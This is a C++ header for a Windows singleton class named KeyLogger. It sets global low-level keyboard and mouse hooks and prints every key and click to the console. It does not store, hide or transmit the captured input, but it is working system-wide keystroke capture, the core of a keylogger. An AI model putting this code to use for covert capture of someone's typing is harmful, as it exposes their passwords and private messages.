#pragma once

#include <map>
#include <string>
#include <bitset>
#include <iostream>
#include <windows.h>
#include <windowsx.h>

///////////////////////////////////////////////////////////////////////////////////
//                       Callback WinAPI declaraction                            //
///////////////////////////////////////////////////////////////////////////////////

LRESULT CALLBACK KeyboardProc(int code, WPARAM wParam, LPARAM lParam);
LRESULT CALLBACK MouseProc(int code, WPARAM wParam, LPARAM lParam);

///////////////////////////////////////////////////////////////////////////////////
//                  Compact single instance class in stack                       //
///////////////////////////////////////////////////////////////////////////////////

class KeyLogger
{
public:
	enum m_keycodeStatus { UNDEFINED = 0, UP, DOWN };

public:
	virtual void onKeyboardEvent(int code, WPARAM wParam, LPARAM lParam) {
		//Inherit to overide callback on keystoke
		//Here is an exemple
		KBDLLHOOKSTRUCT kbdStruct = *((KBDLLHOOKSTRUCT*)lParam);
		std::string key;
		if (this->getKeyCodeToName().find(kbdStruct.vkCode) != this->getKeyCodeToName().end())
			key = this->getKeyCodeToName().at(kbdStruct.vkCode);
		else
			key = "Unknown key";

		if (wParam == WM_KEYDOWN)
		{
			std::cout << key << " is pressed" << std::endl;
		}
		else if (wParam == WM_KEYUP)
		{
			std::cout << key << " is released" << std::endl;
		}
		else {
			std::cout << key << " has an unknown status" << std::endl;
		}
	};

	virtual void onMouseEvent(int code, WPARAM wParam, LPARAM lParam) {
		MSLLHOOKSTRUCT * msl = (MSLLHOOKSTRUCT *)lParam; // Coordonés incorrectes
		POINT pt = reinterpret_cast<MSLLHOOKSTRUCT*>(lParam)->pt;
		POINT pos;
		GetCursorPos(&pos); // Coordonés correctes
		if (wParam == WM_LBUTTONUP)
		{
			std::cout << "Mouse Button up at: " << pt.x << " " << pt.y << std::endl;
		}
		else
		{
			std::cout << "Mouse Button down at: " << pt.x << " " << pt.y << std::endl;
		}
	};

	BOOL refreshNonBlocking() {
		PeekMessage(&m_msg, 0, NULL, 0, 0);
		//DispatchMessage(&m_msg);
		return TRUE;
	}

	BOOL refreshBlocking() {
		return GetMessage(&m_msg, 0, NULL, 0);
	}

	static KeyLogger& getInstance()
	{
		static KeyLogger singleton;
		return singleton;
	}

	const std::map<unsigned char, std::string> &KeyLogger::getKeyCodeToName() const
	{
		return m_keycode2name;
	};

	const std::map<unsigned char, KeyLogger::m_keycodeStatus> &KeyLogger::getKeyCode2Status() const
	{
		return m_keycode2status;
	};

	void KeyLogger::setKeyCodeStatus(unsigned char keycode, KeyLogger::m_keycodeStatus status)
	{
		m_keycode2status[keycode] = status;
	};

	void KeyLogger::setKeyCodeName(unsigned char keycode, const std::string &name)
	{
		m_keycode2name[keycode] = name;
	};

	HHOOK m_hook;
	HHOOK m_hook_mouse;

private:
	std::map<unsigned char, std::string> m_keycode2name;
	std::map<unsigned char, m_keycodeStatus> m_keycode2status;
	MSG m_msg;

	KeyLogger() {
		m_keycode2name = {
			{ 0, "unknown" },
			{ 0x01, "left mouse button" }, { 0x02, "right mouse button" },
			{ 0x03, "Control-break processing" }, { 0x04, "Middle mouse button" },
			{ 0x05, "X1 mouse button" }, { 0x06, "X2 mouse button" },
			{ 0x07, "Unknown button" }, { 0x08, "BACKSPACE" },
			{ 0x09, "TAB" }, { 0x0A, "Unknown button" }, { 0x0B, "Unknown button" }, { 0x0C, "CLEAR" },
			{ 0x0D, "ENTER" }, { 0x0E, "Unknown button" }, { 0x0F, "Unknown button" },
			{ 0x10, "SHIFT" }, { 0x11, "CTRL" }, { 0x12, "ALT" }, { 0x13, "PAUSE" },
			{ 0x14, "CAPS LOCK" }, { 0x15, "IME Kana mode" }, { 0x16, "Undefined button" }, { 0x17, "IME Junja mode" },
			{ 0x18, "IME final mode" }, { 0x19, "IME Hanja mode" }, { 0x1A, "Undefined button" }, { 0x1B, "ESC" },
			{ 0x1C, "IME convert" }, { 0x1D, "IME nonconvert" }, { 0x1E, "IME accept" }, { 0x1F, "IME mode change request" }, { 0x20, "SPACEBAR" }, { 0x21, "PAGE UP" },
			{ 0x22, "PAGE DOWN" }, { 0x23, "END" }, { 0x24, "HOME" }, { 0x25, "LEFT ARROW" }, { 0x26, "UP ARROW" }, { 0x27, "RIGHT ARROW" }, { 0x28, "DOWN ARROW" },
			{ 0x29, "SELECT" }, { 0x2A, "PRINT" }, { 0x2B, "EXECUTE" }, { 0x2C, "PRINT SCREEN" }, { 0x2D, "INS" }, { 0x2E, "DEL" }, { 0x2F, "HELP" },
			{ 0x30, "0" }, { 0x31, "1" }, { 0x32, "2" }, { 0x33, "3" }, { 0x34, "4" }, { 0x35, "5" }, { 0x36, "6" }, { 0x37, "7" }, { 0x38, "8" }, { 0x39, "9" },
			//0x3A-40 -> Undefined
			{ 0x41, "A" }, { 0x42, "B" }, { 0x43, "C" },
			{ 0x44, "D" }, { 0x45, "E" }, { 0x46, "F" },
			{ 0x47, "G" }, { 0x48, "H" }, { 0x49, "I" },
			{ 0x4A, "J" }, { 0x4B, "K" }, { 0x4C, "L" },
			{ 0x4D, "M" }, { 0x4E, "N" }, { 0x4F, "O" },
			{ 0x50, "P" }, { 0x51, "Q" }, { 0x52, "R" },
			{ 0x53, "S" }, { 0x54, "T" }, { 0x55, "U" },
			{ 0x56, "V" }, { 0x57, "W" }, { 0x58, "X" },
			{ 0x59, "Y" }, { 0x5A, "Z" }
		};

		unsigned char byte = 0;
		while (byte < 0xFF) {
			m_keycode2status[byte] = KeyLogger::m_keycodeStatus::UP;
			byte++;
		}
		m_hook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardProc, NULL, 0); //Enable keyboard hook
		m_hook_mouse = SetWindowsHookEx(WH_MOUSE_LL, MouseProc, NULL, 0); //Enable mouse hook
	};
	~KeyLogger() {
		UnhookWindowsHookEx(m_hook);
		UnhookWindowsHookEx(m_hook_mouse);
	};
	KeyLogger(const KeyLogger&);                 // SingleTon Cannot be copied copy-construction
	KeyLogger& operator=(const KeyLogger&);      // SingleTon Cannot be assigned
};